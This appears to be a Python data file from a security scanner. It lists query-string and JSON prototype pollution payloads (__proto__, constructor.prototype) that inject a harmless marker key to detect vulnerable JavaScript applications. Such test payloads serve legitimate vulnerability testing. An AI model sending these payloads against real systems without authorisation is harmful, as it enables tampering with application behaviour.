POLLUTION_KEY = "pp_test"
POLLUTION_VALUE = "1337"


QUERY_PAYLOADS = [
    f"__proto__[{POLLUTION_KEY}]={POLLUTION_VALUE}",
    f"__proto__.{POLLUTION_KEY}={POLLUTION_VALUE}",
    f"constructor[prototype][{POLLUTION_KEY}]={POLLUTION_VALUE}",
    f"constructor.prototype.{POLLUTION_KEY}={POLLUTION_VALUE}",
    f"prototype[{POLLUTION_KEY}]={POLLUTION_VALUE}",
]


JSON_PAYLOADS = [
    {
        "__proto__": {
            POLLUTION_KEY: POLLUTION_VALUE,
        },
    },
    {
        "constructor": {
            "prototype": {
                POLLUTION_KEY: POLLUTION_VALUE,
            },
        },
    },
    {
        "prototype": {
            POLLUTION_KEY: POLLUTION_VALUE,
        },
    },
]
